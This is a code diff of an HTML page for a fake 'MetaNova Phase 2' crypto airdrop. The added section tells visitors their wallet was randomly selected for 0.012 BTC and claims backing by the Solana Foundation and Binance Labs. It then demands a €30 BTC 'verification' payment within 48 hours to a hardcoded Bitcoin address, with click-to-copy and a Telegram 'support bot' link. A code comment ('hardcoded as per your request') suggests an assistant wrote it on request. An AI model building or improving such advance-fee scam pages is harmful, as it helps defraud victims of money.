@@ -27,6 +27,7 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.1); /* Subtle border */
+            position: relative; /* For absolute positioning of copy message */
         }
         .time-box {
             background: linear-gradient(90deg, #6a0dad, #8a2be2); /* Purple gradient */
@@ -54,7 +55,7 @@
             width: 60%;
             height: 60%;
         }
-        .verify-button {
+        .verify-button, .close-button {
             background: linear-gradient(90deg, #8a2be2, #6a0dad); /* Purple gradient */
             color: white;
             padding: 1rem 2rem;
@@ -69,17 +70,9 @@
             border: none;
             width: 100%; /* Full width button */
         }
-        .verify-button:hover {
+        .verify-button:hover, .close-button:hover {
             transform: translateY(-2px);
             box-shadow: 0 8px 25px rgba(138, 43, 226, 0.6);
-        }
-        .qr-code-box {
-            background-color: #ffffff;
-            padding: 0.75rem;
-            border-radius: 0.75rem; /* rounded-xl */
-            display: inline-block;
-            margin-top: 1rem;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
         }
         .wallet-address {
             font-size: 0.875rem; /* text-sm */
@@ -87,7 +80,74 @@
             padding: 0 1rem;
             margin-top: 1rem;
             color: #a0aec0; /* Lighter grey for address */
+            cursor: pointer; /* Indicate it's clickable */
+            position: relative; /* For copy message positioning */
         }
+        .wallet-address:hover {
+            color: #cbd5e0; /* Slightly lighter on hover */
+        }
+
+        /* New section for congratulatory message */
+        .congratulations-section {
+            display: none; /* Hidden by default */
+            text-align: left;
+            padding: 1rem;
+        }
+        .congratulations-section h2 {
+            font-size: 2.25rem; /* text-4xl */
+            font-weight: bold;
+            color: #4CAF50; /* Green for success */
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        .congratulations-section p {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+            color: #cbd5e0; /* light gray text */
+        }
+        .congratulations-section ul {
+            list-style-type: decimal;
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #cbd5e0;
+        }
+        .congratulations-section ul li {
+            margin-bottom: 0.5rem;
+        }
+        .congratulations-section .highlight-text {
+            color: #f7931a; /* Bitcoin orange */
+            font-weight: 600;
+        }
+        .congratulations-section .small-text {
+            font-size: 0.875rem; /* text-sm */
+            color: #a0aec0;
+        }
+        .congratulations-section .support-link {
+            color: #007bff; /* Blue for links */
+            text-decoration: underline;
+        }
+
+        /* Copy confirmation message */
+        .copy-message {
+            position: absolute;
+            bottom: 5px; /* Adjust as needed */
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(76, 175, 80, 0.9); /* Green background */
+            color: white;
+            padding: 0.4rem 0.8rem;
+            border-radius: 0.5rem;
+            font-size: 0.75rem;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none; /* Allows clicks to pass through */
+            z-index: 10;
+            white-space: nowrap; /* Prevent text wrapping */
+        }
+        .copy-message.show {
+            opacity: 1;
+        }
+
         /* Responsive adjustments */
         @media (max-width: 640px) {
             .container {
@@ -108,70 +168,152 @@
             .text-xl {
                 font-size: 1.125rem; /* text-lg */
             }
-            .verify-button {
+            .verify-button, .close-button {
                 padding: 0.8rem 1.5rem;
                 font-size: 1rem;
             }
             .wallet-address {
                 font-size: 0.75rem; /* text-xs */
             }
+            .congratulations-section h2 {
+                font-size: 1.75rem; /* text-3xl */
+            }
+            .copy-message {
+                bottom: 0; /* Adjust for smaller screens */
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="time-box">
-            01:14:36
+        <div id="mainPoster" class="poster-content">
+            <div class="time-box">
+                01:14:36
+            </div>
+
+            <div class="metanova-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                </svg>
+            </div>
+            <h1 class="text-4xl font-bold mb-1">MetaNova</h1>
+            <p class="text-lg text-purple-400 mb-6">PHASE 2</p>
+
+            <p class="text-xl font-semibold mb-2">WALLET SELECTED FOR AIRDROP</p>
+            <p class="text-3xl font-extrabold mb-4 flex items-center justify-center">
+                <svg class="w-8 h-8 mr-2" viewBox="0 0 24 24" fill="currentColor" style="color: #f7931a;">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1.5 15.5v-2h1.5c1.38 0 2.5-1.12 2.5-2.5s-1.12-2.5-2.5-2.5H9v-2h3V7h-3V5.5h-1.5V7h-1.5v2h1.5v2.5c0 1.38 1.12 2.5 2.5 2.5H12v2h-1.5z"/>
+                </svg>
+                0.012 BTC (<span class="text-green-400 ml-1">€ 710</span>)
+            </p>
+            <p class="text-2xl font-bold text-blue-400 mb-6">$ MNV</p>
+
+            <button id="verifyButton" class="verify-button">
+                VERIFY WALLET NOW
+            </button>
+
+            <p class="text-md text-gray-400 mb-2">WALLET ADDRESS FOR VERIFICATION</p>
+            <p id="walletAddressText" class="wallet-address">
+                bc1q4ut0e0fjpmp2324lv4mrrlv7qvjlqs38rpsp3n
+            </p>
+            <div id="copyMessagePoster" class="copy-message">Copied!</div>
         </div>
 
-        <div class="metanova-logo">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-            </svg>
+        <div id="congratulationsSection" class="congratulations-section">
+            <h2 class="text-4xl font-bold mb-4">Congratulations!</h2>
+
+            <p>Your wallet address was randomly selected for the MetaNova Phase 2 Airdrop – backed by the Solana Foundation and Binance Labs.</p>
+
+            <p>You are eligible to receive: <br>
+            <span class="highlight-text">₿0.012 BTC (~€710)</span> in <span class="highlight-text">$MNV</span> tokens</p>
+
+            <p>To complete verification and activate the transfer, you are required to:</p>
+
+            <ul>
+                <li>Send a one-time wallet verification amount of <span class="highlight-text">€30 in BTC</span></li>
+                <li>Funds must be sent within the next 48 hours to secure your eligibility.</li>
+            </ul>
+
+            <p class="font-semibold mt-4">Wallet Address for Verification:</p>
+            <p id="congratulationsWalletAddressText" class="wallet-address">
+                bc1q4ut0e0fjpmp2324lv4mrrlv7qvjlqs38rpsp3n
+            </p>
+            <div id="copyMessageCongrats" class="copy-message">Copied!</div>
+
+            <p class="small-text">Airdrop tokens will be reflected within 24 hours after verification is received.</p>
+
+            <p class="small-text mt-2">Questions? Contact Support Bot here: <a href="https://t.me/MetaNovaHelpDesk" target="_blank" class="support-link">@MetaNovaHelpDesk</a></p>
+
+            <p class="small-text mt-4">Thank you for participating in MetaNova: Future of Finance</p>
+
+            <button id="closeButton" class="close-button">
+                CLOSE
+            </button>
         </div>
-        <h1 class="text-4xl font-bold mb-1">MetaNova</h1>
-        <p class="text-lg text-purple-400 mb-6">PHASE 2</p>
-
-        <p class="text-xl font-semibold mb-2">WALLET SELECTED FOR AIRDROP</p>
-        <p class="text-3xl font-extrabold mb-4 flex items-center justify-center">
-            <svg class="w-8 h-8 mr-2" viewBox="0 0 24 24" fill="currentColor" style="color: #f7931a;">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1.5 15.5v-2h1.5c1.38 0 2.5-1.12 2.5-2.5s-1.12-2.5-2.5-2.5H9v-2h3V7h-3V5.5h-1.5V7h-1.5v2h1.5v2.5c0 1.38 1.12 2.5 2.5 2.5H12v2h-1.5z"/>
-            </svg>
-            0.012 BTC (<span class="text-green-400 ml-1">€ 710</span>)
-        </p>
-        <p class="text-2xl font-bold text-blue-400 mb-6">$ MNV</p>
-
-        <button class="verify-button">
-            VERIFY WALLET NOW
-        </button>
-
-        <p class="text-md text-gray-400 mb-2">WALLET ADDRESS FOR VERIFICATION</p>
-        <div class="qr-code-box">
-            <img id="qrCodeImage" src="" alt="QR Code" class="w-32 h-32 md:w-40 md:h-40 rounded-md">
-        </div>
-        <p id="walletAddressText" class="wallet-address">
-            bc1q4ut0e0fjpmp2324lv4mrrlv7qvjlqs38rpsp3n
-        </p>
     </div>
 
     <script>
-        // Get the wallet address from the HTML element
-        const newWalletAddress = document.getElementById('walletAddressText').textContent.trim();
-        const qrCodeImage = document.getElementById('qrCodeImage');
+        // Get elements
+        const mainPoster = document.getElementById('mainPoster');
+        const congratulationsSection = document.getElementById('congratulationsSection');
+        const verifyButton = document.getElementById('verifyButton');
+        const closeButton = document.getElementById('closeButton');
 
-        // Construct the QR code API URL
-        // Using a reliable QR code API (qrserver.com)
-        const qrCodeApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(newWalletAddress)}`;
+        const walletAddressTextPoster = document.getElementById('walletAddressText');
+        const walletAddressTextCongrats = document.getElementById('congratulationsWalletAddressText');
 
-        // Set the src of the QR code image
-        qrCodeImage.src = qrCodeApiUrl;
+        const copyMessagePoster = document.getElementById('copyMessagePoster');
+        const copyMessageCongrats = document.getElementById('copyMessageCongrats');
 
-        // Optional: Add an error handler for the QR code image
-        qrCodeImage.onerror = function() {
-            console.error("Failed to load QR code image. Please check the wallet address or API.");
-            // You could set a placeholder image here if desired
-            qrCodeImage.src = "https://placehold.co/150x150/FF0000/FFFFFF?text=Error";
-        };
+        // Wallet address (hardcoded as per your request)
+        const walletAddress = "bc1q4ut0e0fjpmp2324lv4mrrlv7qvjlqs38rpsp3n";
+
+        // Set wallet address text in both sections
+        walletAddressTextPoster.textContent = walletAddress;
+        walletAddressTextCongrats.textContent = walletAddress;
+
+        // Function to copy text to clipboard
+        function copyToClipboard(text, messageElement) {
+            const tempInput = document.createElement('textarea');
+            tempInput.value = text;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            try {
+                document.execCommand('copy');
+                messageElement.classList.add('show');
+                setTimeout(() => {
+                    messageElement.classList.remove('show');
+                }, 1500); // Hide after 1.5 seconds
+            } catch (err) {
+                console.error('Failed to copy text: ', err);
+                // Fallback for environments where execCommand might not work
+            } finally {
+                document.body.removeChild(tempInput);
+            }
+        }
+
+        // Event listener for "VERIFY WALLET NOW" button
+        verifyButton.addEventListener('click', () => {
+            mainPoster.style.display = 'none'; // Hide the main poster
+            congratulationsSection.style.display = 'block'; // Show the congratulations section
+        });
+
+        // Event listener for "CLOSE" button in the congratulations section
+        closeButton.addEventListener('click', () => {
+            congratulationsSection.style.display = 'none'; // Hide the congratulations section
+            mainPoster.style.display = 'block'; // Show the main poster
+        });
+
+        // Event listener for clicking the wallet address on the main poster
+        walletAddressTextPoster.addEventListener('click', () => {
+            copyToClipboard(walletAddress, copyMessagePoster);
+        });
+
+        // Event listener for clicking the wallet address on the congratulations section
+        walletAddressTextCongrats.addEventListener('click', () => {
+            copyToClipboard(walletAddress, copyMessageCongrats);
+        });
     </script>
 </body>
 </html>
+
